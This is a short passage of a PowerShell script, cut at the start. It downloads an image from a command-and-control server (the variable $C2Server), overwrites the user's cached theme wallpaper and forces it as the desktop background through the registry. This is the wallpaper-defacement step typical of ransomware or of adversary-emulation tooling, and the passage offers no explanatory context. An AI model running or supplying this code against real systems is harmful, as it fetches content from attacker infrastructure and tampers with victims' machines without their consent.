...
Invoke-WebRequest -useb "http://$($C2Server)/bg.bmp" -Outfile $env:temp\bg.bmp;
Copy-Item -Path $env:temp\bg.bmp -Destination $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper -Force;
Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $env:temp\bg.bmp -Force
